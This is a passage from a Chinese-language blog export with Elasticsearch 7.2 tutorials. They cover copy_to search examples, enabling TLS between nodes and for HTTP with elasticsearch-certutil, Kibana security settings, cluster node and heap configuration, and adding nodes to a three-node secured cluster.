&quot;user&quot; : &quot;东城区-李四&quot;, &quot;message&quot; : &quot;happy birthday!&quot;, &quot;uid&quot; : 4, &quot;age&quot; : 30, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市东城区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.893801&quot;, &quot;lon&quot; : &quot;116.408986&quot; &#125; &#125; &#125;, &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;4&quot;, &quot;_score&quot; : 0.8114117, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;朝阳区-老贾&quot;, &quot;message&quot; : &quot;123,gogogo&quot;, &quot;uid&quot; : 5, &quot;age&quot; : 35, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市朝阳区建国门&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.718256&quot;, &quot;lon&quot; : &quot;116.367910&quot; &#125; &#125; &#125;, &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;5&quot;, &quot;_score&quot; : 0.8114117, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;朝阳区-老王&quot;, &quot;message&quot; : &quot;Happy BirthDay My Friend!&quot;, &quot;uid&quot; : 6, &quot;age&quot; : 50, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市朝阳区国贸&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.918256&quot;, &quot;lon&quot; : &quot;116.467910&quot; &#125; &#125; &#125; ] &#125;&#125;这样我们只对一个region进行操作就可以了，否则我们需要针对country, city及province分别进行搜索。如何查看copy_to的内容在之前的mapping中，我们对region字段加入了如下的一个属性：1234&quot;region&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;store&quot;: true&#125;这里的store属性为true，那么我们可以通过如下的命令来查看文档的region的内容：1GET twitter/_doc/1?stored_fields=region那么它显示的内容如下：12345678910111213141516&#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 1, &quot;_seq_no&quot; : 0, &quot;_primary_term&quot; : 1, &quot;found&quot; : true, &quot;fields&quot; : &#123; &quot;region&quot; : [ &quot;北京&quot;, &quot;北京&quot;, &quot;中国&quot; ] &#125;&#125;如果你想了解更多关于Elastic Stack，请参阅文章“Elasticsearch简介”]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES集群SSL相关]]></title>
    <url>%2F2019%2F12%2F31%2FES%E9%9B%86%E7%BE%A4SSL%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[为您的每个Elasticsearch节点生成一个私钥和X.509证书在Elasticsearch加密通讯前提条件：确认xpack.security.enabled设置为true生成节点证书为您的Elasticsearch集群创建一个证书颁发机构bin/elasticsearch-certutil ca您可以将群集配置为信任具有此CA签名的证书的所有节点。该命令输出单个文件，默认名称为elastic-stack-ca.p12。此文件是PKCS＃12密钥库，其中包含CA的公共证书和用于对每个节点的证书签名的私钥。该elasticsearch-certutil命令还会提示您输入密码以保护文件和密钥。如果您打算将来将更多节点添加到群集中，请保留该文件的副本并记住其密码。为集群中的每个节点生成证书和私钥bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12输出是单个PKCS＃12密钥库，其中包括节点证书，节点密钥和CA证书。还提示您输入密码。您可以输入证书和密钥的密码，也可以按Enter键将密码保留为空白。默认情况下，elasticsearch-certutil生成的证书中没有主机名信息（即，它们没有任何“使用者备用名称”字段）。这意味着您可以对群集中的每个节点使用证书，但是必须关闭主机名验证，如下面的配置所示。如果你想用你的集群中的主机名的验证，运行 elasticsearch-certutil cert命令一次，每个节点和提供的–name，–dns和–ip选项。将节点证书复制到适当的位置将适用的.p12文件复制到每个节点上的Elasticsearch配置目录内的目录中。例如，/home/es/config/certs。无需将CA文件复制到此目录。对于要配置的每个其他Elastic产品，将证书复制到相关的配置目录。加密集群中的节点之间的通信启用TLS并指定访问节点证书所需的信息如果签名证书为PKCS＃12格式，则将以下信息添加到elasticsearch.yml每个节点上的 文件中：1234xpack.security.transport.ssl.enabled: truexpack.security.transport.ssl.verification_mode: certificate xpack.security.transport.ssl.keystore.path: certs/elastic-certificates.p12 xpack.security.transport.ssl.truststore.path: certs/elastic-certificates.p12如果在命令中使用–dns或–ip选项，elasticsearch-certutil cert并且要启用严格的主机名检查，请将验证模式设置为 full。有关xpack.security.transport.ssl.verification_mode这些值的描述，请参见。如果为每个节点创建了单独的证书，则可能需要在每个节点上自定义此路径。如果文件名与节点名称匹配，则可以使用certs/${node.name}.p12例如格式。所述elasticsearch-certutil输出PKCS＃12密钥库，其包括CA证书作为信任证书的条目。这允许密钥库也用作信任库。在这种情况下，路径值应与该keystore.path值匹配。但是请注意，这不是一般规则。有些密钥库不能用作信任库，只有经过特殊设计的密钥库才能使用如果证书为PEM格式，则将以下信息添加到elasticsearch.yml每个节点上的 文件中：12345xpack.security.transport.ssl.enabled: truexpack.security.transport.ssl.verification_mode: certificate xpack.security.transport.ssl.key: /home/es/config/node01.key xpack.security.transport.ssl.certificate: /home/es/config/node01.crt xpack.security.transport.ssl.certificate_authorities: [ &quot;/home/es/config/ca.crt&quot; ]如果在命令中使用–dns或–ip选项，elasticsearch-certutil cert并且要启用严格的主机名检查，请将验证模式设置为 full。有关xpack.security.transport.ssl.verification_mode这些值的描述，请参见。节点密钥文件的完整路径。该位置必须在Elasticsearch配置目录中。节点证书的完整路径。该位置必须在Elasticsearch配置目录中。应当信任的CA证书路径的数组。这些路径必须是Elasticsearch配置目录中的位置。如果您使用密码保护了节点证书的安全，请将密码添加到您的Elasticsearch密钥库中：3.1 如果签名证书为PKCS＃12格式，请使用以下命令：12bin/elasticsearch-keystore add xpack.security.transport.ssl.keystore.secure_passwordbin/elasticsearch-keystore add xpack.security.transport.ssl.truststore.secure_password3.2 如果证书为PEM格式，请使用以下命令：1bin/elasticsearch-keystore add xpack.security.transport.ssl.secure_key_passphrase重新启动Elasticsearch您必须执行完全集群重启。配置为使用TLS的节点无法与使用未加密网络的节点通信（反之亦然）。启用TLS之后，您必须重新启动所有节点，以维护整个群集之间的通信。Elasticsearch监视配置为TLS相关节点设置值的所有文件，例如证书，密钥，密钥库或信任库。如果您更新了这些文件中的任何一个（例如，当您的主机名更改或您的证书到期时），Elasticsearch将重新加载它们。以全局Elasticsearch resource.reload.interval.high 设置（默认为5秒）确定的频率轮询文件是否有更改加密HTTP客户端通信启用TLS并指定访问节点证书所需的信息如果证书采用PKCS＃12格式，则将以下信息添加到elasticsearch.yml每个节点上的 文件中：123xpack.security.http.ssl.enabled: truexpack.security.http.ssl.keystore.path: certs/elastic-certificates.p12 xpack.security.http.ssl.truststore.path: certs/elastic-certificates.p12如果为每个节点创建了单独的证书，则可能需要在每个节点上自定义此路径。如果文件名与节点名称匹配，则可以使用certs/${node.name}.p12例如格式。该elasticsearch-certutil输出包括PKCS＃12密钥库内部的CA证书，因此密钥库也可以被用作信任库。此名称应与keystore.path值匹配。如果证书为PEM格式，则将以下信息添加到elasticsearch.yml每个节点上的 文件中：1234xpack.security.http.ssl.enabled: truexpack.security.http.ssl.key: /home/es/config/node01.key xpack.security.http.ssl.certificate: /home/es/config/node01.crt xpack.security.http.ssl.certificate_authorities: [ &quot;/home/es/config/ca.crt&quot; ]节点密钥文件的完整路径。该位置必须在Elasticsearch配置目录中。节点证书的完整路径。该位置必须在Elasticsearch配置目录中。应当信任的CA证书路径的数组。这些路径必须是Elasticsearch配置目录中的位置。如果您使用密码保护了节点证书的安全，请将密码添加到您的Elasticsearch密钥库中：3.1 如果签名证书为PKCS＃12格式，请使用以下命令：12bin/elasticsearch-keystore add xpack.security.http.ssl.keystore.secure_passwordbin/elasticsearch-keystore add xpack.security.http.ssl.truststore.secure_password3.2 如果证书为PEM格式，请使用以下命令：1bin/elasticsearch-keystore add xpack.security.http.ssl.secure_key_passphrase重新启动ElasticsearchElasticsearch监视配置为TLS相关节点设置值的所有文件，例如证书，密钥，密钥库或信任库。如果您更新了这些文件中的任何一个（例如，当您的主机名更改或您的证书到期时），Elasticsearch将重新加载它们。以全局Elasticsearch resource.reload.interval.high 设置（默认为5秒）确定的频率轮询文件是否有更改配置监视功能以使用加密的连接Elastic Stack监视功能由两个组件组成：您在每个Elasticsearch和Logstash节点上安装的代理，以及Kibana中的Monitoring UI。监视代理程序从节点收集指标并为其建立索引，您可以通过Kibana中的“监视”仪表板可视化数据。代理可以为同一Elasticsearch集群上的数据建立索引，或将其发送到外部监视集群。要在启用安全性功能的情况下使用监视功能，您需要 设置Kibana以使用安全性功能， 并为监视UI创建至少一个用户。如果使用的是外部监视群集，则还需要为监视代理程序配置用户，并配置代理程序以在与监视群集通信时使用适当的凭据。在Kibana配置安全当集群上启用了X-Pack安全性时，Kibana用户必须登录。您可以为Kibana用户配置X-Pack安全角色，以控制这些用户可以访问哪些数据。通过Kibana向Elasticsearch发出的大多数请求都使用登录用户的凭据进行身份验证。但是，Kibana服务器需要向Elasticsearch集群提出一些内部请求。因此，您必须为Kibana服务器配置凭据以用于那些请求。启用X-Pack安全性后，如果加载Kibana仪表板来访问未经授权查看的索引中的数据，则会出现错误，指示该索引不存在。X-Pack安全性当前不提供控制哪些用户可以加载哪些仪表板的方法。在Elasticsearch配置安全1.1 验证xpack.security.enabled设置是否true在群集中的每个节点上。如果您使用基本或试用许可证，则默认值为false。1.2 配置用于节点间通信的传输层安全性（TLS / SSL）1.3 设置所有内置用户的密码Elasticsearch安全功能提供 内置用户来帮助您启动和运行。该elasticsearch-setup-passwords命令是首次设置内置用户密码的最简单方法。1bin/elasticsearch-setup-passwords interactive该elasticsearch-setup-passwords命令使用瞬态引导密码，该密码在命令成功运行后将不再有效。您不能elasticsearch-setup-passwords再次运行该命令。相反，您可以从Kibana中的“ 管理”&gt;“用户” UI 更新密码，或使用安全用户API。配置Kibana以使用适当的内置用户更新kibana.yml配置文件中的以下设置：12elasticsearch.username: &quot;kibana&quot;elasticsearch.password: &quot;kibanapassword&quot;Kibana服务器以该用户身份提交请求，以访问集群监视API和.kibana索引。该服务器并没有需要访问用户索引。内置kibana用户的密码通常是在Elasticsearch上的X-Pack安全配置过程中设置的。xpack.security.encryptionKey在kibana.yml 配置文件中设置属性。您可以使用32个字符或更长的任何文本字符串作为加密密钥。1xpack.security.encryptionKey: &quot;something_at_least_32_characters&quot;可选：更改默认会话持续时间。默认情况下，会话保持活动状态，直到关闭浏览器。要更改持续时间，请xpack.security.sessionTimeout在kibana.yml配置文件中设置 属性。超时以毫秒为单位。例如，将超时设置为600000以使会话在10分钟后过期：1xpack.security.sessionTimeout: 600000可选：配置Kibana以加密通信。Kibana支持客户端请求的传输层安全性（TLS / SSL）加密。如果您正在使用X-Pack安全性或为Elasticsearch提供HTTPS端点的代理，则可以配置Kibana通过HTTPS访问Elasticsearch。因此，Kibana和Elasticsearch之间的通信也被加密。5.1 配置Kibana以加密浏览器和Kibana服务器之间的通信：您无需为这种类型的加密启用X-Pack安全性。为Kibana生成服务器证书。a. 您必须将证书的 subjectAltName名称设置为Kibana服务器的主机名，标准域名（FQDN）或IP地址，或者将CN设置为Kibana服务器的主机名或FQDN。将服务器的IP地址用作CN无效。b. 设置server.ssl.enabled，server.ssl.key以及server.ssl.certificate 在性能kibana.yml：123server.ssl.enabled: trueserver.ssl.key: /path/to/your/server.keyserver.ssl.certificate: /path/to/your/server.crt进行这些更改之后，您必须始终通过HTTPS访问Kibana。例如， https：// localhost：5601。5.2 配置Kibana以通过HTTPS连接到Elasticsearch要执行此步骤，您必须 启用Elasticsearch安全功能，或者必须具有为Elasticsearch提供HTTPS端点的代理。a. elasticsearch.hosts在Kibana配置文件的设置中指定HTTPS协议kibana.yml：1elasticsearch.hosts: [&quot;https://&lt;your_elasticsearch_host&gt;.com:9200&quot;]b. 如果您使用自己的CA为Elasticsearch签名证书，请在中进行 elasticsearch.ssl.certificateAuthorities设置kibana.yml以指定PEM文件的位置。1elasticsearch.ssl.certificateAuthorities: /path/to/your/cacert.pem设置certificateAuthorities属性可以使您使用默认 verificationMode选项full。5.3 （可选）如果启用了弹性监视功能，请配置Kibana以通过HTTPS连接到Elasticsearch监视集群：要执行此步骤，您必须启用Elasticsearch安全功能，或者必须具有为Elasticsearch提供HTTPS端点的代理。a. xpack.monitoring.elasticsearch.hosts在Kibana配置文件的设置中指定HTTPS URL ，kibana.yml1xpack.monitoring.elasticsearch.hosts: [&quot;https://&lt;your_monitoring_cluster&gt;:9200&quot;]b. xpack.monitoring.elasticsearch.ssl.*在kibana.yml文件中指定设置 。例如，如果您使用自己的证书颁发机构来签署证书，请在文件中指定PEM文件的位置kibana.yml：1xpack.monitoring.elasticsearch.ssl.certificateAuthorities: /path/to/your/cacert.pem重新启动Kibana选择一种身份验证机制，并向用户授予使用Kibana所需的特权可以在Kibana 的“ 管理/安全性/角色”页面上管理特权,授予用户访问将在Kibana中使用的索引的权限在Elasticsearch中配置监视在Kibana中配置监视配置Logstash节点的监视]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elastic stack 7.2技术栈【一】Elasticsearch 7.2 技术栈安装与配置概要的说明]]></title>
    <url>%2F2019%2F12%2F31%2Felastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E4%B8%80%E3%80%91%E2%80%94%E2%80%94%20%E9%9C%80%E8%A6%81%E6%8E%8C%E6%8F%A1%E7%9A%84%E4%B8%80%E4%BA%9Belastic%E9%87%8D%E8%A6%81%E6%A6%82%E5%BF%B5%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%2F</url>
    <content type="text"><![CDATA[Elasticsearch 7.2 技术栈安装与配置概要的说明我们将大体上按以下步骤逐步安装和配置出一套满足生产环境运行要求和信息安全管理要求的三节点es服务集群。在节点1上面先行安装一套es+kinaba+beats的单节点服务详细步骤可以参考官网这个教程：get-started-elastic-stack继续在单节点的结构下启用和配置出es安全管理功能详细步骤可以参考官网这个教程：security-getting-started进行面向支持多节点的加密通信改造的相关配置，同时将节点2、3加入es集群中详细步骤可以参考官网这个教程：encrypting-internode-communications我们之所以没有选择按一步到位的方法部署整套es集群，是因为在启用和配置xpack的部分很容易遇到问题。参照上面的三个步骤，可以依次部署、配置并对结果进行验证，在前一步骤部署成功的基础上继续做更多内容的部署，这样处理的成功率会比较高。版本及许可的说明操作系统使用centos7 minimual，升级到最新小版本。elasticsearch技术栈均采用 7.2版本，默认使用basic许可，可免费使用xpack部分安全管理服务。使用官网下载的tar.gz安装包进行部署。一些elastic重要概念与配置参数ES 是在 lucene 的基础上进行研发的，隐藏了 lucene 的复杂性，提供简单易用的 RESTful Api接口。ES 的分片相当于 lucene 的索引。Node 节点的几种部署实例实例一: 只用于数据存储和数据查询，降低其资源消耗率12node.master: falsenode.data: true实例二: 来协调各种创建索引请求或者查询请求，但不存储任何索引数据12node.master: truenode.data: false实例三: 主要用 于查询负载均衡， 并请求分发到多个指定的node服务器，并对各个node服务器返回的结果进行一个汇总处理，最终返回给客户端12node.master: falsenode.data: false实例四: 即有成为主节点的资格，又存储数据12node.master: truenode.data: true在只有3个节点的部署方案中，建议设置3个节点均有成为master节点的资格，且存储索引数据。数据目录配置与物理磁盘的使用一般来说，是这样配置：123path: logs: /var/log/elasticsearch data: /var/data/elasticsearch数据目录可以支持使用多个：12345path: data: - /mnt/elasticsearch_1 - /mnt/elasticsearch_2 - /mnt/elasticsearch_3物理磁盘的使用：由于es已经提供了数据副本的冗余，所以建议使用raid0，不通过raid提供额外的数据保护；当有多块数据盘时，通过path.data配置把数据条带化分配到多块盘上是可行的，但建议是通过设置raid0将多块物理磁盘整合为一块逻辑盘使用，以确保每个分片都是被放入的同样的目录；集群名称配置1cluster.name: logging-prodnode节点名称默认为使用主机名，也可以在elasticsearch.yml中指定。在一个主机上同时跑多个es实例时，这个配置项就会很有帮助了。1node.name: prod-data-2网络地址配置默认将服务绑定到loopback接口，这需要按实际情况调整。1network.host: 10.20.0.11注：变更服务绑定接口后，会被认为是作为生产环境使用，会触发es的环境检查操作。当有不符要求的系统或集群配置参数时，es服务会无法启动。节点发现和cluster初始化参数单播主机列表通过discovery.zen.ping.unicast.hosts来配置。这个配置在 elasticsearch.yml 文件中：1discovery.zen.ping.unicast.hosts: [&quot;host1&quot;, &quot;host2:port&quot;]具体的值是一个主机数组或逗号分隔的字符串。每个值应采用host：port或host的形式（其中port默认为设置transport.profiles.default.port，如果未设置则返回transport.tcp.port）。请注意，必须将IPv6主机置于括号内。此设置的默认值为127.0.0.1，[:: 1]。使用单播，你可以为 Elasticsearch 提供一些它应该去尝试连接的节点列表。当一个节点联系到单播列表中的成员时，它就会得到整个集群所有节点的状态，然后它会联系 master 节点，并加入集群。12345678discovery.seed_hosts: - 192.168.1.10:9300 - 192.168.1.11 - seeds.mydomain.comcluster.initial_master_nodes: - master-node-a - master-node-b - master-node-c提供了seed.hosts参数的三种赋值方式initial_master_nodes参数只能使用节点的node.name参数值，一般来说是主机名Zen Discovery 是 ES 默认内建发现机制。它提供单播和多播的发现方式，并且可以扩展为通过插件支持云环境和其他形式的发现。Elasticsearch 官方推荐我们使用 单播 代替 组播。而且 Elasticsearch 默认被配置为使用 单播 发现，以防止节点无意中加入集群。设置JVM heap size通过jvm.options文件设置jvm缓存参数，过大或过小都不好，过大的缓存也会让垃圾回收变慢。当jvm缓存设置大于26GB时，需要评估zero-based compressed oops限制，参见下面的说明：https://www.elastic.co/guide/en/elasticsearch/reference/current/heap-size.html由于ES构建基于lucene, 而lucene设计强大之处在于lucene能够很好的利用操作系统内存来缓存索引数据，以提供快速的查询性能。lucene的索引文件segements是存储在单文件中的，并且不可变，对于OS来说，能够很友好地将索引文件保持在cache中，以便快速访问；因此，我们很有必要将一半的物理内存留给lucene ; 另一半的物理内存留给ES（JVM heap )。所以， 在ES内存设置方面，可以遵循以下原则：当机器内存小于64G时，遵循通用的原则，50%给ES，50%留给lucene。当机器内存大于64G时，遵循以下原则：a. 如果主要的使用场景是全文检索, 那么建议给ES Heap分配 4~32G的内存即可；其它内存留给操作系统, 供lucene使用（segments cache), 以提供更快的查询性能。b. 如果主要的使用场景是聚合或排序， 并且大多数是numerics, dates, geo_points 以及not_analyzed的字符类型， 建议分配给ES Heap分配 4~32G的内存即可，其它内存留给操作系统，供lucene使用(doc values cache)，提供快速的基于文档的聚类、排序性能。c. 如果使用场景是聚合或排序，并且都是基于analyzed 字符数据，这时需要更多的 heap size, 建议机器上运行多ES实例，每个实例保持不超过50%的ES heap设置(但不超过32G，堆内存设置32G以下时，JVM使用对象指标压缩技巧节省空间)，50%以上留给lucene。禁止swap，一旦允许内存与磁盘的交换，会引起致命的性能问题。 通过： 在elasticsearch.yml 中 bootstrap.memory_lock: true， 以保持JVM锁定内存，保证ES的性能。操作系统通过交换（swap）将内存的分页写入磁盘，es在内存中保留了很多运行时必需的数据和缓存，所以消耗磁盘的操作将严重影响正在运行的集群。关闭es交换最彻底的方法是，在elasticsearch.yml文件中将bootstrap.mlockall设置为true 。GC设置原则：a. 保持GC的现有设置，默认设置为：Concurrent-Mark and Sweep (CMS)，别换成G1GC，因为目前G1还有很多BUG。b. 保持线程池的现有设置，目前ES的线程池较1.X有了较多优化设置，保持现状即可；默认线程池大小等于CPU核心数。如果一定要改，按公式（（CPU核心数* 3）/ 2）+ 1 设置；不能超过CPU核心数的2倍；但是不建议修改默认配置，否则会对CPU造成硬伤。Temp directory配置在使用.tar.gz方式部署es服务时，建议指定一个安全的临时文件目录，避免因为默认使用的/tmp下的临时目录被操作系统定期删除，造成服务故障。通过环境变量 $ES_TMPDIR 来设置。分片分配的感知分配感知（allocation awareness）是管理在哪里放置数据的副本。https://www.elastic.co/guide/en/elasticsearch/reference/7.2/allocation-awareness.html1. 基于分片的分配分配感知允许用户使用自定义的参数来配置分片的分配。通过定义一组键，然后在合适的节点上设置这个键，就可以开启分配感知。elasticsearch.yml1cluster.routing.allocation.awareness.attributes: rack_id注：支持赋多个值同时用作感知属性，如cluster.routing.allocation.awareness.attributes: rack, group, zone针对每个es节点，用户可以修改elasticsearch.yml，按期待的网络配置来设置该值。ES允许用户在节点上设置元数据，这些元数据的键将成为我们要使用的分配感知参数。1node.attr.rack_id: rack_one当有多个es节点可用时，es会尽量把分片与副本均衡到rack_id值不同的节点上去。但如果只剩一个可用的es数据节点了，es也会选择把一个索引的分片和副本全部部署在同一个节点上面。常见的使用场景是按照地点、机架或是虚拟机等来划分集群的拓扑。2. 强制性的分配感知在用户事先规则好分片分组信息，且希望限制每个分组的副本分片数量时，强制分配感知是适用的解决方法。在这种情况下，即便因为部分分组的数据节点不可用，导致es服务可用性风险，es也不会把索引的分片与副本都部署在相同的分组节点上面。例如，用户想在区域级别使用强制分配。可以先指定一个zone的属性，然后为该分组添加多个维度。如下所示：12cluster.routing.allocation.awareness.attributes: zonecluster.routing.allocation.force.zone.values: us-east, us-west此时，我们在东部地区启用了一批节点，这些节点的配置都是node.attr.zone: us-east ，在创建索引时由于以上限制，副本分片只会被均衡到没有相应zone值的节点上去。3. 动态设置分片感知可以通过集群设置API在运行时进行修改，这个修改的效果可以自行选择是持久的，还是临时性的。123456curl -XPUT localhost:9200/_cluster/settings -d &apos;&#123; &quot;persistent&quot;: &#123; &quot;cluster.routing.allocation.awareness.attributes&quot;: zone &quot;cluster.routing.allocation.force.zone.values&quot;: us-east, us-west &#125;&#125;&apos;]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elastic stack 7.2技术栈【五】向es集群中增加更多节点并配置节点间的加密通信]]></title>
    <url>%2F2019%2F12%2F31%2Felastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E4%BA%94%E3%80%91%E2%80%94%E2%80%94%20%E5%90%91es%E9%9B%86%E7%BE%A4%E4%B8%AD%E5%A2%9E%E5%8A%A0%E6%9B%B4%E5%A4%9A%E8%8A%82%E7%82%B9%E5%B9%B6%E9%85%8D%E7%BD%AE%E8%8A%82%E7%82%B9%E9%97%B4%E7%9A%84%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[本章节的配置内容，是建立在成功部署和配置了前面几个章节的基础之上。制作数字证书在一个安全的集群中，Elasticsearch节点在与其他节点通信时会使用证书来标识自己。群集必须验证这些证书的真实性。 建议的方法是信任特定的证书颁发机构（CA）。 因此，当节点添加到群集时，需要他们使用由同一CA签名的证书。制作ca证书：1./bin/elasticsearch-certutil ca使用默认输出文件名elastic-stack-ca.p12，并为证书设置访问口令：my-elastic123。如果是你的生产集群，请注意做好证书和口令的保护。创建一个目录用于存放证书：12cd $&#123;ES_HOME&#125;/configmkdir certs为节点1制作证书和密钥：1./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --ip 10.20.0.11 --out config/certs/es-node1.p12输入ca的口令，并为节点1的证书设置口令为：es-node123elasticsearch-certutil工具提供了更多复杂的证书管理功能，如果有使用需求可以参见：https://www.elastic.co/guide/en/elasticsearch/reference/7.2/certutil.html配置集群节点间的加密通信编辑elasticsearch.yml文件，修改以下参数。1）禁用single-node discovery：1discovery.type: single-node我们之前为了调试单节点的es功能而启用的这个参数，现在直接从配置文件中清除这一配置项，使用默认值即可。2）设置这次启动中有资格成为master节点的主机列表：1cluster.initial_master_nodes: [&quot;es-node1&quot;]因为此时我们还只有一个节点。如果是已经有多个具备master node资格的节点时，则这里需要把它们都维护在列表中。这一参数仅在集群初次建立时有用。3）为传输（节点间）通信启用传输层安全性（TLS / SSL）：ES_PATH_CONF/elasticsearch.yml1234xpack.security.enabled: truexpack.security.transport.ssl.enabled: truexpack.security.transport.ssl.keystore.path: certs/$&#123;node.name&#125;.p12xpack.security.transport.ssl.truststore.path: certs/$&#123;node.name&#125;.p12将PKCS＃12文件的密码存储在Elasticsearch密钥库中。123./bin/elasticsearch-keystore create./bin/elasticsearch-keystore add xpack.security.transport.ssl.keystore.secure_password./bin/elasticsearch-keystore add xpack.security.transport.ssl.truststore.secure_password如果elasticsearch keystore文件已经存在了，则可以跳过创建命令系统将提示你提供为es-node1.p12文件创建的密码。 我们将此文件用于传输TLS密钥库和信任库，因此为这两个设置提供相同的密码。1234[elastic@es-node1 elasticsearch-7.2.0]$ ./bin/elasticsearch-keystore listkeystore.seedxpack.security.transport.ssl.keystore.secure_passwordxpack.security.transport.ssl.truststore.secure_password重新启动es服务：1./bin/elasticsearch以及kibana服务：1./bin/kibana向es集群中添加更多的节点es可以使用的节点有很多类型，详见：https://www.elastic.co/guide/en/elasticsearch/reference/7.2/modules-node.html 。我们在这里向集群中添加两个节点，每个节点都既作为master-eligible node（node.master: true），也作为data node（node.data： true）。1）我们先配置好另外的两个主机节点参照本文第一部分的内容对系统进行初始化配置；参照本文第二部分，第1章节的内容部署elasticsearch程序，暂不启动es服务；2）在节点1上为新增的两个节点制作证书1./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --multiple依次为es-node2, es-node3生成证书，得到名为certificate-bundle.zip的输出文件；为简单起见，统一将两个新节点证书的密码也设置为和节点1相同的 es-node123 ；将解压缩后得到证书文件，参照节点1的存放路径（/opt/elasticsearch-7.2.0/config/certs），分别部署到节点2和节点3上去。3）编辑3个节点的ES_PATH_CONF/elasticsearch.yml文件节点es-node1：12345678910cluster.name: my-elasticnode.name: es-node1bootstrap.memory_lock: truenetwork.host: 10.20.0.11cluster.initial_master_nodes: [&quot;es-node1&quot;,&quot;es-node2&quot;,&quot;es-node3&quot;]discovery.seed_hosts: [&quot;10.20.0.11&quot;,&quot;10.20.0.12&quot;,&quot;10.20.0.13&quot;]xpack.security.enabled: truexpack.security.transport.ssl.enabled: truexpack.security.transport.ssl.keystore.path: certs/$&#123;node.name&#125;.p12xpack.security.transport.ssl.truststore.path: certs/$&#123;node.name&#125;.p12节点es-node2：12345678910cluster.name: my-elasticnode.name: es-node2bootstrap.memory_lock: truenetwork.host: 10.20.0.12cluster.initial_master_nodes: [&quot;es-node1&quot;,&quot;es-node2&quot;,&quot;es-node3&quot;]discovery.seed_hosts: [&quot;10.20.0.11&quot;,&quot;10.20.0.12&quot;,&quot;10.20.0.13&quot;]xpack.security.enabled: truexpack.security.transport.ssl.enabled: truexpack.security.transport.ssl.keystore.path: certs/$&#123;node.name&#125;.p12xpack.security.transport.ssl.truststore.path: certs/$&#123;node.name&#125;.p12节点es-node3：123456789cluster.name: my-elasticnode.name: es-node3bootstrap.memory_lock: truenetwork.host: 10.20.0.13cluster.initial_master_nodes: [&quot;es-node1&quot;,&quot;es-node2&quot;,&quot;es-node3&quot;]discovery.seed_hosts: [&quot;10.20.0.11&quot;,&quot;10.20.0.12&quot;,&quot;10.20.0.13&quot;]xpack.security.enabled: truexpack.security.transport.ssl.enabled: truexpack.security.transport.ssl.keystore.path: certs/$&#123;node.name&#125;.p12xpack.security.transport.ssl.truststore.path: certs/$&#123;node.name&#125;.p124）将两个新节点的PKCS#12 证书口令存储在Elasticsearch Keystore中123./bin/elasticsearch-keystore create./bin/elasticsearch-keystore add xpack.security.transport.ssl.keystore.secure_password./bin/elasticsearch-keystore add xpack.security.transport.ssl.truststore.secure_password根据提示，将节点证书的密码信息es-node123保存到es密钥库中5）依次启动三个节点上的es服务1./bin/elasticsearch注意观察日志输出启动kibana，在dev tools中执行GET _cluster/health 查看集群健康状态。执行 GET _cat/nodes?v 查看master node角色分布：]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elastic stack 7.2技术栈【四】在单机版es技术栈之上启用和配置es安全管理功能]]></title>
    <url>%2F2019%2F12%2F31%2Felastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E5%9B%9B%E3%80%91%E2%80%94%E2%80%94%20%E5%9C%A8%E5%8D%95%E6%9C%BA%E7%89%88es%E6%8A%80%E6%9C%AF%E6%A0%88%E4%B9%8B%E4%B8%8A%E5%90%AF%E7%94%A8%E5%92%8C%E9%85%8D%E7%BD%AEes%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD%2F</url>
